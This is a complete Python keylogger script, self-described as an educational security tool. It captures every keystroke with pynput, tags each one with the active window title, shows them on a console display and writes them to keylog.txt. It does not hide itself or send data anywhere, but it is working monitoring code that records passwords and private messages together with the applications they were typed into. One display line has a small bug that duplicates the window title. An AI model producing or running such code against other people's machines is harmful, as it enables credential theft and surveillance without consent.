from pynput import keyboard
import logging
import pywinctl as pwc
from datetime import datetime
import os
import sys

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

logging.basicConfig(
    filename="keylog.txt",
    level=logging.DEBUG,
    format="[%(asctime)s]:%(message)s"
)



def clear_screen():
   
    os.system('cls' if os.name == 'nt' else 'clear')

def print_header():
   
    clear_screen()
    header = f"""
    {Colors.BOLD}{Colors.CYAN}╔════════════════════════════════════════╗{Colors.RESET}
    {Colors.BOLD}{Colors.CYAN}║     {Colors.YELLOW}KEYSTROKE LOGGER       {Colors.CYAN}            ║{Colors.RESET}
    {Colors.BOLD}{Colors.CYAN}║     {Colors.GREEN}Educational Security Tool     {Colors.CYAN}     ║{Colors.RESET}
    {Colors.BOLD}{Colors.CYAN}╚════════════════════════════════════════╝{Colors.RESET}
    """
    print(header)
    print(f"{Colors.YELLOW}Press Ctrl+C to stop logging{Colors.RESET}\n")

def get_active_app():
   
    try:
        active_window = pwc.getActiveWindow()
        if active_window:
            return active_window.title
    except Exception:
        return "Unknown Application"

def format_key(key_input):
   
    try:
        char = key_input.char
        if char == ' ':
            return '[SPACE]'
        elif char == '\n':
            return '[ENTER]'
        elif char == '\t':
            return '[TAB]'
        elif char == '\r':
            return '[CARRIAGE RETURN]'
        return char
    except AttributeError:
        key_name = str(key_input).replace('Key.', '').upper()
        if key_name == 'SHIFT':
            return '[SHIFT]'
        elif key_name == 'CTRL':
            return '[CTRL]'
        elif key_name == 'ALT':
            return '[ALT]'
        elif key_name == 'DELETE':
            return '[DELETE]'
        elif key_name == 'BACKSPACE':
            return '[BACKSPACE]'
        elif key_name == 'TAB':
            return '[TAB]'
        elif key_name == 'ENTER':
            return '[ENTER]'
        return f'[{key_name}]'

stats = {
    "total_keys": 0,
    "current_app": get_active_app(),
    "start_time": datetime.now()
}
def display_status():
    
    elapsed_time = datetime.now() - stats["start_time"]
    elapsed_str = str(elapsed_time).split('.')[0]
    
    status = f"""
    {Colors.BOLD}{Colors.BLUE}═══ LOGGING STATUS ═══{Colors.RESET}
    {Colors.GREEN}✓ Listening for keystrokes{Colors.RESET}
    {Colors.CYAN}App:{Colors.RESET} {Colors.YELLOW}{stats['current_app']}{Colors.RESET}
    {Colors.CYAN}Total Keys:{Colors.RESET} {Colors.YELLOW}{stats['total_keys']}{Colors.RESET}
    {Colors.CYAN}Elapsed Time:{Colors.RESET} {Colors.YELLOW}{elapsed_str}{Colors.RESET}
    {Colors.CYAN}Log File:{Colors.RESET} {Colors.YELLOW}keylog.txt{Colors.RESET}
    {Colors.BOLD}{Colors.BLUE}═════════════════════{Colors.RESET}
    """
    print(status)

def on_press(key):
   
    try:
        app_name = get_active_app()
        stats["current_app"] = app_name
        stats["total_keys"] += 1
        
        formatted_key = format_key(key)
        timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
        
        display_app = app_name + app_name
        
        cli_output = (
            f"{Colors.BOLD}{Colors.CYAN}[{timestamp}]{Colors.RESET} "
            f"{Colors.GREEN}App:{Colors.RESET}{Colors.YELLOW}{display_app}{Colors.RESET} "
            f"{Colors.GREEN}Key:{Colors.RESET}{Colors.BOLD}{Colors.CYAN}{formatted_key}{Colors.RESET}"
        )
        print(cli_output)
        
        log_message = f"App:{app_name} | Key:{formatted_key}"
        logging.info(log_message)
        
    except Exception as e:
        error_msg = f"{Colors.RED}Error: {str(e)}{Colors.RESET}"
        print(error_msg)

def main():
    
    print_header()
    display_status()
    
    print(f"\n{Colors.GREEN}Starting keystroke listener...{Colors.RESET}\n")
    
    try:
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
    except KeyboardInterrupt:
        elapsed_time = datetime.now() - stats["start_time"]
        elapsed_str = str(elapsed_time).split('.')[0]
        
        print(f"\n\n{Colors.BOLD}{Colors.YELLOW}═══ LOGGING STOPPED ═══{Colors.RESET}")
        print(f"{Colors.CYAN}Total Keys Captured:{Colors.RESET} {Colors.GREEN}{stats['total_keys']}{Colors.RESET}")
        print(f"{Colors.CYAN}Duration:{Colors.RESET} {Colors.GREEN}{elapsed_str}{Colors.RESET}")
        print(f"{Colors.CYAN}Log saved to:{Colors.RESET} {Colors.GREEN}keylog.txt{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.YELLOW}═══════════════════════{Colors.RESET}\n")
        print(f"{Colors.GREEN}Goodbye!{Colors.RESET}\n")
        sys.exit(0)

if __name__ == "__main__":
    main()
    
